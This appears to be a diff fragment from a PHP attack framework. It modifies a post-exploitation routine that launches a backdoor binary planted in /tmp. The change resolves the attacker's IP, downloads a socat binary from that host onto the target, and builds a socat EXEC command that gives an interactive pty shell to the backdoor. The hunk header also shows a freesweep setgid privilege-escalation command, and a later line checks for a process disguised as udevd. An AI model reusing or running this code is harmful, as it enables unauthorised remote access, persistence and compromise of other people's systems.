@@ -258,7 +258,12 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
         $this->pause();
         $data = "/tmp/$backdoor_name &";
         $this->req_str($stream,$data,$this->stream_timeout,"");
-        $data = "socat - EXEC:\"/tmp/$backdoor_name\",pty,stderr,setsid,sigint,ctty,sane";
+        
+        $ip_attacker = $this->ip4addr4target($this->ip);
+        $filename = "socat";
+        $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
+        
+        $data = "$path_remotebin_socat - EXEC:\"/tmp/$backdoor_name\",pty,stderr,setsid,sigint,ctty,sane";
         //$this->req_str($stream,$data,$this->stream_timeout,"");
         $data = "ps -aux | grep udevd";
         $this->req_str($stream,$data,$this->stream_timeout,"");
